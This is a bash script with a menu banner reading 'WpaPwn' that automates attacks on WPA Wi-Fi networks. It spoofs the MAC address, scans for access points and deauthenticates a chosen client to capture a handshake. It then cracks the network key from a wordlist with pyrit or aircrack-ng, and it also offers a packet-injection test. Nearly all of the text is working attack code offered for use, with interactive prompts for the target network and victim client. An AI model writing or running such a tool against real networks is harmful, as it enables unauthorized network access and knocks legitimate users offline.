injectiontest() {
clear
OS=`uname`
IO="" 
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
aireplay-ng -9 $DEVICE
}
macspoof() {
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo -n "Please Enter Mac Address You Would Like To Spoof: "
read spoof
ifconfig $DEVICE down
macchanger -m $spoof $DEVICE
clear 
ifconfig  $DEVICE up
echo "Your New Mac Address is $spoof"
} 

pyrit1() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
screen -m -D airodump-ng -w out --encrypt WPA $DEVICE &
sleep 10 
killall screen
cat out-01.csv |grep WPA |awk '{print $1} ' |cut -d "," -f 1
echo
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1 |cut -b 1-1 |cut -d "-" -f1 `;;
   *) channel="Unknown";;
esac
clear
sleep 2 
cat out-01.csv |grep "00:1E:2A:09:0B:08" |awk '{print $1} ' |cut -d "," -f 1 
echo 
echo -n "Please Enter Client To Deauthenticate: "
read vic
airodump-ng -c $channel -w wpa --bssid $bss $DEVICE &
screen -m -D aireplay-ng -0 30 -a $bss -c $vic $DEVICE 
sleep 10 
killall screen
killall airodump-ng
sleep 2
pyrit -r wpa-01.cap -i /pentest/passwords/wordlists/wpalist.txt attack_passthrough 
rm wpa-*
rm out-*
}


aircrack() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
screen -m -D airodump-ng -w out --encrypt WPA $DEVICE &
sleep 10 
killall screen
cat out-01.csv |grep WPA |awk '{print $1} ' |cut -d "," -f 1
echo
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1 |cut -b 1-1 |cut -d "-" -f1 `;;
   *) channel="Unknown";;
esac
clear
sleep 2 
cat out-01.csv |grep "00:1E:2A:09:0B:08" |awk '{print $1} ' |cut -d "," -f 1 
echo 
echo -n "Please Enter Client To Deauthenticate: "
read vic
airodump-ng -c $channel -w wpa --bssid $bss $DEVICE &
screen -m -D aireplay-ng -0 30 -a $bss -c $vic $DEVICE 
sleep 10 
killall screen
killall airodump-ng
aircrack-ng -w /pentest/passwords/wordlists/wpalist.txt wpa-01.cap -b $bss  
rm wpa-*
rm out-*


}

menu1() {
   clear
cat << EOF
 
888       888                d8888 8888888b.                888b    888 
888   o   888               d88888 888   Y88b               8888b   888 
888  d8b  888              d88P888 888    888               88888b  888 
888 d888b 888 88888b.     d88P 888 888   d88P 888  888  888 888Y88b 888 
888d88888b888 888 "88b   d88P  888 8888888P"  888  888  888 888 Y88b888 
88888P Y88888 888  888  d88P   888 888        888  888  888 888  Y88888 
8888P   Y8888 888 d88P d8888888888 888        Y88b 888 d88P 888   Y8888 
888P     Y888 88888P" d88P     888 888         "Y8888888P"  888    Y888 
              888                                                       
              888                                                       
              888             

EOF

   
echo "   Please Select A Type Of Attack"
echo
echo "      1. WPA Pyrit Cuda"
echo "      2. WPA Aircrack"
echo "      3  Injection Test"
echo "      4. Spoof Mac Address"
echo "      5. Exit"
echo
echo -n ">>"
}
menu2() {

   while true
   do
   menu1
   read answer
   case $answer in
   1)
      pyrit1
  ;;   
   2)
      aircrack
  ;;
   3)
      injectiontest
  ;;
   4)
      macspoof  
  ;;
   5)
      exit
  ;;
   *)
     menu2
  ;;
   esac
   done
}

case "$1" in
    help)
   menu2
  ;;     

    *)
   menu2
  ;;
esac
}
